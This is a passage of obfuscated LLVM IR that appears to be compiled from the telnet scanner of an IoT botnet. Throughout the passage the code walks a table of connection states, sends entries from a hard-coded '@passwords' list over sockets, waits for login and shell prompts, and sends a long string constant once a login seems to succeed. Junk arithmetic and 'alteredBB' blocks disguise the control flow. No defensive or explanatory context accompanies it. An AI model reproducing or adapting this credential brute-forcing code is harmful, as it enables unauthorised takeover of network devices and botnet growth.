  %_160 = shl i32 %3500, 10
  %_161 = shl i32 %3500, 10
  %_162 = sub i32 %3500, 10
  %gen163 = mul i32 %_162, 10
  %3501 = add i32 %3500, 10
  %3502 = zext i32 %3501 to i64
  %3503 = call i64 @time(i64* null) #2
  %3504 = icmp slt i64 %3502, %3503
  br label %originalBB153

originalBB167alteredBB:                           ; preds = %originalBB167, %1094
  %3505 = load i32, i32* %2, align 4
  %3506 = sext i32 %3505 to i64
  %3507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3506
  %3508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3507, i32 0, i32 0
  %3509 = load i32, i32* %3508, align 16
  %3510 = call i32 @sclose(i32 %3509)
  %3511 = load i32, i32* %2, align 4
  %3512 = sext i32 %3511 to i64
  %3513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3512
  %3514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3513, i32 0, i32 2
  store i8 0, i8* %3514, align 8
  %3515 = load i32, i32* %2, align 4
  %3516 = sext i32 %3515 to i64
  %3517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3516
  %3518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3517, i32 0, i32 3
  store i8 1, i8* %3518, align 1
  br label %originalBB167

originalBB171alteredBB:                           ; preds = %originalBB171, %1133
  %3519 = load i32, i32* %2, align 4
  %3520 = sext i32 %3519 to i64
  %3521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3520
  %3522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3521, i32 0, i32 0
  %3523 = load i32, i32* %3522, align 16
  %3524 = call i32 @sclose(i32 %3523)
  %3525 = load i32, i32* %2, align 4
  %3526 = sext i32 %3525 to i64
  %3527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3526
  %3528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3527, i32 0, i32 2
  store i8 0, i8* %3528, align 8
  %3529 = load i32, i32* %2, align 4
  %3530 = sext i32 %3529 to i64
  %3531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3530
  %3532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3531, i32 0, i32 3
  store i8 1, i8* %3532, align 1
  br label %originalBB171

originalBB175alteredBB:                           ; preds = %originalBB175, %1169
  %3533 = load i32, i32* %2, align 4
  %3534 = sext i32 %3533 to i64
  %3535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3534
  %3536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3535, i32 0, i32 6
  %3537 = load i32, i32* %3536, align 4
  %3538 = icmp eq i32 %3537, 0
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %1285
  %3539 = load i32, i32* %2, align 4
  %3540 = sext i32 %3539 to i64
  %3541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3540
  %3542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3541, i32 0, i32 2
  store i8 5, i8* %3542, align 8
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %1317
  %3543 = load i32, i32* %2, align 4
  %3544 = sext i32 %3543 to i64
  %3545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3544
  %3546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3545, i32 0, i32 8
  %3547 = load i8*, i8** %3546, align 8
  %3548 = call i8* @strstr(i8* %3547, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %3549 = icmp ne i8* %3548, null
  br label %originalBB183

originalBB187alteredBB:                           ; preds = %originalBB187, %1387
  %3550 = load i32, i32* %2, align 4
  %3551 = sext i32 %3550 to i64
  %3552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3551
  %3553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3552, i32 0, i32 0
  %3554 = load i32, i32* %3553, align 16
  %3555 = call i32 @sclose(i32 %3554)
  %3556 = load i32, i32* %2, align 4
  %3557 = sext i32 %3556 to i64
  %3558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3557
  %3559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3558, i32 0, i32 2
  store i8 0, i8* %3559, align 8
  %3560 = load i32, i32* %2, align 4
  %3561 = sext i32 %3560 to i64
  %3562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3561
  %3563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3562, i32 0, i32 3
  store i8 0, i8* %3563, align 1
  br label %originalBB187

originalBB191alteredBB:                           ; preds = %originalBB191, %1426
  %3564 = load i32, i32* %2, align 4
  %3565 = sext i32 %3564 to i64
  %3566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3565
  %3567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3566, i32 0, i32 0
  %3568 = load i32, i32* %3567, align 16
  %3569 = call i32 @sclose(i32 %3568)
  %3570 = load i32, i32* %2, align 4
  %3571 = sext i32 %3570 to i64
  %3572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3571
  %3573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3572, i32 0, i32 2
  store i8 0, i8* %3573, align 8
  %3574 = load i32, i32* %2, align 4
  %3575 = sext i32 %3574 to i64
  %3576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3575
  %3577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3576, i32 0, i32 3
  store i8 0, i8* %3577, align 1
  br label %originalBB191

originalBB195alteredBB:                           ; preds = %originalBB195, %1457
  %3578 = load i32, i32* %2, align 4
  %3579 = sext i32 %3578 to i64
  %3580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3579
  %3581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3580, i32 0, i32 8
  %3582 = load i8*, i8** %3581, align 8
  %3583 = call i8* @strstr(i8* %3582, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %3584 = icmp ne i8* %3583, null
  br label %originalBB195

originalBB199alteredBB:                           ; preds = %originalBB199, %1626
  %3585 = load i32, i32* %2, align 4
  %3586 = sext i32 %3585 to i64
  %3587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3586
  %3588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3587, i32 0, i32 0
  %3589 = load i32, i32* %3588, align 16
  %3590 = load i32, i32* %2, align 4
  %3591 = sext i32 %3590 to i64
  %3592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3591
  %3593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3592, i32 0, i32 5
  %3594 = load i8, i8* %3593, align 1
  %3595 = zext i8 %3594 to i64
  %3596 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3595
  %3597 = load i8*, i8** %3596, align 8
  %3598 = load i32, i32* %2, align 4
  %3599 = sext i32 %3598 to i64
  %3600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3599
  %3601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3600, i32 0, i32 5
  %3602 = load i8, i8* %3601, align 1
  %3603 = zext i8 %3602 to i64
  %3604 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3603
  %3605 = load i8*, i8** %3604, align 8
  %3606 = call i64 @strlen(i8* %3605) #10
  %3607 = call i64 @send(i32 %3589, i8* %3597, i64 %3606, i32 16384)
  %3608 = icmp slt i64 %3607, 0
  br label %originalBB199

originalBB203alteredBB:                           ; preds = %originalBB203, %1724
  %3609 = load i32, i32* %2, align 4
  %3610 = sext i32 %3609 to i64
  %3611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3610
  %3612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3611, i32 0, i32 0
  %3613 = load i32, i32* %3612, align 16
  %3614 = load i32, i32* %2, align 4
  %3615 = sext i32 %3614 to i64
  %3616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3615
  %3617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3616, i32 0, i32 8
  %3618 = load i8*, i8** %3617, align 8
  %3619 = load i32, i32* %2, align 4
  %3620 = sext i32 %3619 to i64
  %3621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3620
  %3622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3621, i32 0, i32 7
  %3623 = load i16, i16* %3622, align 16
  %3624 = zext i16 %3623 to i32
  %3625 = call i32 @readUntil(i32 %3613, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3618, i32 1024, i32 %3624)
  %3626 = icmp ne i32 %3625, 0
  br label %originalBB203

originalBB207alteredBB:                           ; preds = %originalBB207, %1759
  %3627 = load i32, i32* %2, align 4
  %3628 = sext i32 %3627 to i64
  %3629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3628
  %3630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3629, i32 0, i32 6
  store i32 0, i32* %3630, align 4
  %3631 = load i32, i32* %2, align 4
  %3632 = sext i32 %3631 to i64
  %3633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3632
  %3634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3633, i32 0, i32 7
  store i16 0, i16* %3634, align 16
  %3635 = load i32, i32* %2, align 4
  %3636 = sext i32 %3635 to i64
  %3637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3636
  %3638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3637, i32 0, i32 8
  %3639 = load i8*, i8** %3638, align 8
  %3640 = call i8* @strstr(i8* %3639, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %3641 = icmp ne i8* %3640, null
  br label %originalBB207

originalBB211alteredBB:                           ; preds = %originalBB211, %1839
  %3642 = load i32, i32* %2, align 4
  %3643 = sext i32 %3642 to i64
  %3644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3643
  %3645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3644, i32 0, i32 2
  store i8 7, i8* %3645, align 8
  br label %originalBB211

originalBB215alteredBB:                           ; preds = %originalBB215, %1949
  %3646 = load i32, i32* %2, align 4
  %3647 = sext i32 %3646 to i64
  %3648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3647
  %3649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3648, i32 0, i32 2
  store i8 7, i8* %3649, align 8
  br label %originalBB215

originalBB219alteredBB:                           ; preds = %originalBB219, %1976
  %3650 = load i32, i32* %2, align 4
  %3651 = sext i32 %3650 to i64
  %3652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3651
  %3653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3652, i32 0, i32 0
  %3654 = load i32, i32* %3653, align 16
  %3655 = load i32, i32* %2, align 4
  %3656 = sext i32 %3655 to i64
  %3657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3656
  %3658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3657, i32 0, i32 8
  %3659 = load i8*, i8** %3658, align 8
  %3660 = load i32, i32* %2, align 4
  %3661 = sext i32 %3660 to i64
  %3662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3661
  %3663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3662, i32 0, i32 7
  %3664 = load i16, i16* %3663, align 16
  %3665 = zext i16 %3664 to i32
  %3666 = call i32 @readUntil(i32 %3654, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3659, i32 1024, i32 %3665)
  %3667 = icmp ne i32 %3666, 0
  br label %originalBB219

originalBB223alteredBB:                           ; preds = %originalBB223, %2011
  %3668 = load i32, i32* %2, align 4
  %3669 = sext i32 %3668 to i64
  %3670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3669
  %3671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3670, i32 0, i32 6
  store i32 0, i32* %3671, align 4
  %3672 = load i32, i32* %2, align 4
  %3673 = sext i32 %3672 to i64
  %3674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3673
  %3675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3674, i32 0, i32 7
  store i16 0, i16* %3675, align 16
  %3676 = load i32, i32* %2, align 4
  %3677 = sext i32 %3676 to i64
  %3678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3677
  %3679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3678, i32 0, i32 8
  %3680 = load i8*, i8** %3679, align 8
  %3681 = call i8* @strstr(i8* %3680, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %3682 = icmp ne i8* %3681, null
  br label %originalBB223

originalBB227alteredBB:                           ; preds = %originalBB227, %2093
  %3683 = load i32, i32* %2, align 4
  %3684 = sext i32 %3683 to i64
  %3685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3684
  %3686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3685, i32 0, i32 6
  store i32 0, i32* %3686, align 4
  %3687 = load i32, i32* %2, align 4
  %3688 = sext i32 %3687 to i64
  %3689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3688
  %3690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3689, i32 0, i32 7
  store i16 0, i16* %3690, align 16
  %3691 = load i32, i32* %2, align 4
  %3692 = sext i32 %3691 to i64
  %3693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3692
  %3694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3693, i32 0, i32 8
  %3695 = load i8*, i8** %3694, align 8
  %3696 = call i8* @strstr(i8* %3695, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %3697 = icmp ne i8* %3696, null
  br label %originalBB227

originalBB231alteredBB:                           ; preds = %originalBB231, %2125
  %3698 = load i32, i32* %2, align 4
  %3699 = sext i32 %3698 to i64
  %3700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3699
  %3701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3700, i32 0, i32 8
  %3702 = load i8*, i8** %3701, align 8
  call void @llvm.memset.p0i8.i64(i8* %3702, i8 0, i64 1024, i32 1, i1 false)
  %3703 = load i32, i32* %2, align 4
  %3704 = sext i32 %3703 to i64
  %3705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3704
  %3706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3705, i32 0, i32 0
  %3707 = load i32, i32* %3706, align 16
  %3708 = call i32 @sclose(i32 %3707)
  %3709 = load i32, i32* %2, align 4
  %3710 = sext i32 %3709 to i64
  %3711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3710
  %3712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3711, i32 0, i32 2
  store i8 0, i8* %3712, align 8
  %3713 = load i32, i32* %2, align 4
  %3714 = sext i32 %3713 to i64
  %3715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3714
  %3716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3715, i32 0, i32 3
  store i8 0, i8* %3716, align 1
  br label %originalBB231

originalBB235alteredBB:                           ; preds = %originalBB235, %2207
  %3717 = load i32, i32* %2, align 4
  %3718 = sext i32 %3717 to i64
  %3719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3718
  %3720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3719, i32 0, i32 8
  %3721 = load i8*, i8** %3720, align 8
  call void @llvm.memset.p0i8.i64(i8* %3721, i8 0, i64 1024, i32 1, i1 false)
  %3722 = load i32, i32* %2, align 4
  %3723 = sext i32 %3722 to i64
  %3724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3723
  %3725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3724, i32 0, i32 0
  %3726 = load i32, i32* %3725, align 16
  %3727 = call i32 @sclose(i32 %3726)
  %3728 = load i32, i32* %2, align 4
  %3729 = sext i32 %3728 to i64
  %3730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3729
  %3731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3730, i32 0, i32 2
  store i8 0, i8* %3731, align 8
  %3732 = load i32, i32* %2, align 4
  %3733 = sext i32 %3732 to i64
  %3734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3733
  %3735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3734, i32 0, i32 3
  store i8 0, i8* %3735, align 1
  br label %originalBB235

originalBB239alteredBB:                           ; preds = %originalBB239, %2248
  %3736 = load i32, i32* %2, align 4
  %3737 = sext i32 %3736 to i64
  %3738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3737
  %3739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3738, i32 0, i32 8
  %3740 = load i8*, i8** %3739, align 8
  call void @llvm.memset.p0i8.i64(i8* %3740, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB239

originalBB243alteredBB:                           ; preds = %originalBB243, %2336
  %3741 = load i32, i32* %2, align 4
  %3742 = sext i32 %3741 to i64
  %3743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3742
  %3744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3743, i32 0, i32 0
  %3745 = load i32, i32* %3744, align 16
  %3746 = load i32, i32* %2, align 4
  %3747 = sext i32 %3746 to i64
  %3748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3747
  %3749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3748, i32 0, i32 8
  %3750 = load i8*, i8** %3749, align 8
  %3751 = load i32, i32* %2, align 4
  %3752 = sext i32 %3751 to i64
  %3753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3752
  %3754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3753, i32 0, i32 7
  %3755 = load i16, i16* %3754, align 16
  %3756 = zext i16 %3755 to i32
  %3757 = call i32 @readUntil(i32 %3745, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3750, i32 1024, i32 %3756)
  %3758 = icmp ne i32 %3757, 0
  br label %originalBB243

originalBB247alteredBB:                           ; preds = %originalBB247, %2371
  %3759 = load i32, i32* %2, align 4
  %3760 = sext i32 %3759 to i64
  %3761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3760
  %3762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3761, i32 0, i32 6
  store i32 0, i32* %3762, align 4
  %3763 = load i32, i32* %2, align 4
  %3764 = sext i32 %3763 to i64
  %3765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3764
  %3766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3765, i32 0, i32 7
  store i16 0, i16* %3766, align 16
  %3767 = load i32, i32* %2, align 4
  %3768 = sext i32 %3767 to i64
  %3769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3768
  %3770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3769, i32 0, i32 8
  %3771 = load i8*, i8** %3770, align 8
  %3772 = call i8* @strstr(i8* %3771, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %3773 = icmp ne i8* %3772, null
  br label %originalBB247

originalBB251alteredBB:                           ; preds = %originalBB251, %2403
  %3774 = load i32, i32* %2, align 4
  %3775 = sext i32 %3774 to i64
  %3776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3775
  %3777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3776, i32 0, i32 8
  %3778 = load i8*, i8** %3777, align 8
  call void @llvm.memset.p0i8.i64(i8* %3778, i8 0, i64 1024, i32 1, i1 false)
  %3779 = load i32, i32* %2, align 4
  %3780 = sext i32 %3779 to i64
  %3781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3780
  %3782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3781, i32 0, i32 0
  %3783 = load i32, i32* %3782, align 16
  %3784 = call i32 @sclose(i32 %3783)
  %3785 = load i32, i32* %2, align 4
  %3786 = sext i32 %3785 to i64
  %3787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3786
  %3788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3787, i32 0, i32 2
  store i8 0, i8* %3788, align 8
  %3789 = load i32, i32* %2, align 4
  %3790 = sext i32 %3789 to i64
  %3791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3790
  %3792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3791, i32 0, i32 3
  store i8 0, i8* %3792, align 1
  br label %originalBB251

originalBB255alteredBB:                           ; preds = %originalBB255, %2444
  %3793 = load i32, i32* %2, align 4
  %3794 = sext i32 %3793 to i64
  %3795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3794
  %3796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3795, i32 0, i32 8
  %3797 = load i8*, i8** %3796, align 8
  call void @llvm.memset.p0i8.i64(i8* %3797, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB255

originalBB259alteredBB:                           ; preds = %originalBB259, %2521
  %3798 = load i32, i32* %2, align 4
  %3799 = sext i32 %3798 to i64
  %3800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3799
  %3801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3800, i32 0, i32 2
  store i8 7, i8* %3801, align 8
  br label %originalBB259

originalBB263alteredBB:                           ; preds = %originalBB263, %2548
  %3802 = load i32, i32* %2, align 4
  %3803 = sext i32 %3802 to i64
  %3804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3803
  %3805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3804, i32 0, i32 0
  %3806 = load i32, i32* %3805, align 16
  %3807 = load i32, i32* %2, align 4
  %3808 = sext i32 %3807 to i64
  %3809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3808
  %3810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3809, i32 0, i32 8
  %3811 = load i8*, i8** %3810, align 8
  %3812 = load i32, i32* %2, align 4
  %3813 = sext i32 %3812 to i64
  %3814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3813
  %3815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3814, i32 0, i32 7
  %3816 = load i16, i16* %3815, align 16
  %3817 = zext i16 %3816 to i32
  %3818 = call i32 @readUntil(i32 %3806, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3811, i32 1024, i32 %3817)
  %3819 = icmp ne i32 %3818, 0
  br label %originalBB263

originalBB267alteredBB:                           ; preds = %originalBB267, %2630
  %3820 = load i32, i32* %2, align 4
  %3821 = sext i32 %3820 to i64
  %3822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3821
  %3823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3822, i32 0, i32 8
  %3824 = load i8*, i8** %3823, align 8
  %3825 = call i64 @strlen(i8* %3824) #10
  %3826 = trunc i64 %3825 to i16
  %3827 = load i32, i32* %2, align 4
  %3828 = sext i32 %3827 to i64
  %3829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3828
  %3830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3829, i32 0, i32 7
  store i16 %3826, i16* %3830, align 16
  br label %originalBB267

originalBB271alteredBB:                           ; preds = %originalBB271, %2658
  %3831 = load i32, i32* %2, align 4
  %3832 = sext i32 %3831 to i64
  %3833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3832
  %3834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3833, i32 0, i32 6
  %3835 = load i32, i32* %3834, align 4
  %_272 = shl i32 %3835, 10
  %_273 = sub i32 %3835, 10
  %gen274 = mul i32 %_273, 10
  %3836 = add i32 %3835, 10
  %3837 = zext i32 %3836 to i64
  %3838 = call i64 @time(i64* null) #2
  %3839 = icmp slt i64 %3837, %3838
  br label %originalBB271

originalBB278alteredBB:                           ; preds = %originalBB278, %2699
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2744
  %3840 = load i32, i32* %2, align 4
  %3841 = sext i32 %3840 to i64
  %3842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3841
  %3843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3842, i32 0, i32 0
  %3844 = load i32, i32* %3843, align 16
  %3845 = call i64 @send(i32 %3844, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i64 9, i32 16384)
  %3846 = icmp slt i64 %3845, 0
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2783
  %3847 = load i32, i32* %2, align 4
  %3848 = sext i32 %3847 to i64
  %3849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3848
  %3850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3849, i32 0, i32 2
  store i8 9, i8* %3850, align 8
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2804
  %3851 = load i32, i32* %2, align 4
  %3852 = sext i32 %3851 to i64
  %3853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3852
  %3854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3853, i32 0, i32 0
  %3855 = load i32, i32* %3854, align 16
  %3856 = call i64 @send(i32 %3855, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %3857 = icmp slt i64 %3856, 0
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %2888
  %3858 = load i32, i32* %2, align 4
  %3859 = sext i32 %3858 to i64
  %3860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3859
  %3861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3860, i32 0, i32 0
  %3862 = load i32, i32* %3861, align 16
  %3863 = load i32, i32* %2, align 4
  %3864 = sext i32 %3863 to i64
  %3865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3864
  %3866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3865, i32 0, i32 8
  %3867 = load i8*, i8** %3866, align 8
  %3868 = load i32, i32* %2, align 4
  %3869 = sext i32 %3868 to i64
  %3870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3869
  %3871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3870, i32 0, i32 7
  %3872 = load i16, i16* %3871, align 16
  %3873 = zext i16 %3872 to i32
  %3874 = call i32 @readUntil(i32 %3862, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3867, i32 1024, i32 %3873)
  %3875 = icmp ne i32 %3874, 0
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %3115
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %3132
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %3149
  %3876 = load i32, i32* %2, align 4
  %3877 = sext i32 %3876 to i64
  %3878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3877
  %3879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3878, i32 0, i32 6
  %3880 = load i32, i32* %3879, align 4
  %_307 = sub i32 %3880, 10
  %gen308 = mul i32 %_307, 10
  %_309 = sub i32 %3880, 10
  %gen310 = mul i32 %_309, 10
  %_311 = sub i32 0, %3880
  %gen312 = add i32 %_311, 10
  %_313 = sub i32 %3880, 10
  %gen314 = mul i32 %_313, 10
  %_315 = shl i32 %3880, 10
  %3881 = add i32 %3880, 10
  %3882 = zext i32 %3881 to i64
  %3883 = call i64 @time(i64* null) #2
  %3884 = icmp slt i64 %3882, %3883
  br label %originalBB306

originalBB319alteredBB:                           ; preds = %originalBB319, %3175
  %3885 = load i32, i32* %2, align 4
  %3886 = sext i32 %3885 to i64
  %3887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3886
  %3888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3887, i32 0, i32 0
  %3889 = load i32, i32* %3888, align 16
